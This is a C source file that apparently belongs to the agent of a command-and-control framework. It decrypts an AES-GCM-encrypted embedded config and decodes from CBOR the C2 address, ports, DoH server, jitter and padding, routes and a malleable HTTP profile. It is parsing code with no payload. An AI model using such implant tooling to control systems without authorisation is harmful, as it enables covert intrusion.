/*
 * config.c — decrypt and decode the embedded build config.
 *
 * The agent binary carries def.AgentConfig, which is not plain CBOR: it is
 * encrypted exactly like Go's crypto.AES_GCM_Decrypt format:
 *
 *   salt[16] || nonce[12] || AES-256-GCM(ciphertext || tag)
 *   key = PBKDF2-HMAC-SHA256(password = MagicString, salt, 100000, 32)
 *
 * c2_config_decrypt reverses that into a CBOR buffer; c2_agent_config_decode
 * then reads only the keys the agent needs to talk to the C2. Unknown keys are
 * skipped, so a config written by a newer builder still decodes.
 */

#include "transport.h"

#include "cbor_util.h"
#include "crypto.h"

#include "cbor.h"

/* ------------------------------------------------------------------------- */
/* Build config decryption                                                    */
/* ------------------------------------------------------------------------- */

/* The embedded config uses the same password-based AES-GCM container as the
 * memfs entries (salt[16] || nonce[12] || ct||tag, PBKDF2-SHA256 key). */
c2_status c2_config_decrypt(const c2_crypto_backend *be, c2_str magic,
                            const uint8_t *enc, size_t enc_len, uint8_t *out,
                            size_t out_cap, size_t *out_len) {
  return c2_aes_gcm_decrypt_password(be, magic, enc, enc_len, out, out_cap,
                                     out_len);
}

/* ------------------------------------------------------------------------- */
/* Nested structures                                                          */
/* ------------------------------------------------------------------------- */

static c2_status decode_routes(CborValue *it, c2_routes *r) {
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
      C2_CASE_TEXT(C2_KEY_ROUTE_CHECKIN, r, checkin);
      C2_CASE_TEXT(C2_KEY_ROUTE_MSG, r, msg);
      C2_CASE_TEXT(C2_KEY_ROUTE_FTP, r, ftp);
      C2_CASE_TEXT(C2_KEY_ROUTE_WWW, r, www);
      C2_CASE_TEXT(C2_KEY_ROUTE_PROXY, r, proxy);
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

/* CustomHeaders is map[string]string: text keys, not the integer keys the
 * rest of the protocol uses. */
static c2_status decode_custom_headers(CborValue *it, c2_http_profile *p) {
  if (p->header_keys == NULL || p->header_values == NULL)
    return c2_cbor_map_skip(it); /* caller does not want them */
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  p->header_count = 0;
  while (!cbor_value_at_end(&map)) {
    if (!cbor_value_is_text_string(&map))
      return C2_ERR_PROTO;
    c2_str k;
    c2_str v;
    if ((st = c2_cbor_read_text(&map, &k)) != C2_OK)
      return st;
    if ((st = c2_cbor_read_text(&map, &v)) != C2_OK)
      return st;
    if (p->header_count < p->header_cap) {
      p->header_keys[p->header_count] = k;
      p->header_values[p->header_count] = v;
    }
    p->header_count++;
  }
  if (p->header_count > p->header_cap)
    return C2_ERR_NOMEM;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

/* TransportOptions is map[string]string (CBOR key 83). Keep the pairs as
 * borrowed slices into the decrypted config buffer. */
static c2_status decode_transport_options(CborValue *it, c2_agent_config *cfg) {
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  cfg->transport_option_count = 0;
  while (!cbor_value_at_end(&map)) {
    if (!cbor_value_is_text_string(&map))
      return C2_ERR_PROTO;
    c2_str key;
    c2_str value;
    if ((st = c2_cbor_read_text(&map, &key)) != C2_OK)
      return st;
    if ((st = c2_cbor_read_text(&map, &value)) != C2_OK)
      return st;
    if (cfg->transport_option_count >= C2_TRANSPORT_OPTIONS_MAX)
      return C2_ERR_NOMEM;
    cfg->transport_options[cfg->transport_option_count].key = key;
    cfg->transport_options[cfg->transport_option_count].value = value;
    cfg->transport_option_count++;
  }
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

static c2_status decode_profile(CborValue *it, c2_http_profile *p) {
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
      C2_CASE_TEXT(C2_KEY_HTTP_PATH, p, c2_path);
      C2_CASE_TEXT(C2_KEY_HTTP_SESSION_HEADER, p, session_header);
      C2_CASE_TEXT(C2_KEY_HTTP_SESSION_VALUE, p, session_value);
      C2_CASE_TEXT(C2_KEY_HTTP_INIT_HEADER, p, init_header);
      C2_CASE_TEXT(C2_KEY_HTTP_INIT_VALUE, p, init_value);
      C2_CASE_TEXT(C2_KEY_HTTP_CLOSE_HEADER, p, close_header);
      C2_CASE_TEXT(C2_KEY_HTTP_CLOSE_VALUE, p, close_value);
    case C2_KEY_HTTP_CUSTOM_HEADERS:
      st = decode_custom_headers(&map, p);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

/* ------------------------------------------------------------------------- */
/* Build config decode                                                        */
/* ------------------------------------------------------------------------- */

c2_status c2_agent_config_decode(CborValue *r, c2_agent_config *cfg) {
  if (r == NULL || cfg == NULL)
    return C2_ERR_ARG;

  CborValue map;
  c2_status st = c2_cbor_map_enter(r, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
      C2_CASE_TEXT(C2_KEY_CFG_CC_ADDRESS, cfg, cc_address);
      C2_CASE_TEXT(C2_KEY_CFG_CC_HTTP_PORT, cfg, cc_http_port);
      C2_CASE_TEXT(C2_KEY_CFG_CC_H2_PORT, cfg, cc_h2_port);
      C2_CASE_TEXT(C2_KEY_CFG_PASSWORD, cfg, password);
      C2_CASE_TEXT(C2_KEY_CFG_CAPEM, cfg, ca_pem);
      C2_CASE_TEXT(C2_KEY_CFG_DOH_SERVER, cfg, doh_server);
      C2_CASE_TEXT(C2_KEY_CFG_AGENT_UUID, cfg, agent_uuid);
      C2_CASE_BYTES(C2_KEY_CFG_AGENT_UUID_SIG, cfg, agent_uuid_sig);
      C2_CASE_TEXT(C2_KEY_CFG_AGENT_TAG, cfg, agent_tag);
      C2_CASE_INT32(C2_KEY_CFG_PADDING_MIN, cfg, padding_min);
      C2_CASE_INT32(C2_KEY_CFG_PADDING_MAX, cfg, padding_max);
      C2_CASE_INT32(C2_KEY_CFG_JITTER, cfg, jitter);
      C2_CASE_INT32(C2_KEY_CFG_POLL_INTERVAL, cfg, poll_interval);
      C2_CASE_INT32(C2_KEY_CFG_POLL_WINDOW, cfg, poll_window);
      C2_CASE_INT32(C2_KEY_CFG_OFFLINE_GRACE, cfg, offline_grace);
      C2_CASE_TEXT(C2_KEY_CFG_C2_CHANNEL_MODE, cfg, c2_channel_mode);
    case C2_KEY_CFG_IS_RUN_BY_STAGER: {
      int v = 0;
      if ((st = c2_cbor_read_bool(&map, &v)) == C2_OK)
        cfg->is_run_by_stager = v;
      break;
    }
    case C2_KEY_CFG_C2_ROUTES:
      st = decode_routes(&map, &cfg->routes);
      break;
    case C2_KEY_CFG_MALLEABLE_C2:
      st = decode_profile(&map, &cfg->http);
      break;
    case C2_KEY_CFG_TRANSPORT_OPTIONS:
      st = decode_transport_options(&map, cfg);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  st = c2_cbor_dc(cbor_value_leave_container(r, &map));
  if (st != C2_OK)
    return st;

  /* Fill defaults exactly like def.NormalizeC2Routes + the channel default. */
  if (!cfg->routes.checkin.ptr)
    cfg->routes.checkin = c2_str_lit(C2_ROUTE_DEFAULT_CHECKIN);
  if (!cfg->routes.msg.ptr)
    cfg->routes.msg = c2_str_lit(C2_ROUTE_DEFAULT_MSG);
  if (!cfg->routes.ftp.ptr)
    cfg->routes.ftp = c2_str_lit(C2_ROUTE_DEFAULT_FTP);
  if (!cfg->routes.www.ptr)
    cfg->routes.www = c2_str_lit(C2_ROUTE_DEFAULT_WWW);
  if (!cfg->routes.proxy.ptr)
    cfg->routes.proxy = c2_str_lit(C2_ROUTE_DEFAULT_PROXY);
  if (!cfg->c2_channel_mode.ptr)
    cfg->c2_channel_mode = c2_str_lit(C2_CHANNEL_DEFAULT);
  return C2_OK;
}

c2_str c2_agent_config_option(const c2_agent_config *cfg, const char *key) {
  if (cfg == NULL || key == NULL)
    return c2_str_of(NULL, 0);
  for (size_t i = 0; i < cfg->transport_option_count; i++) {
    if (c2_str_equal(cfg->transport_options[i].key, key))
      return cfg->transport_options[i].value;
  }
  return c2_str_of(NULL, 0);
}
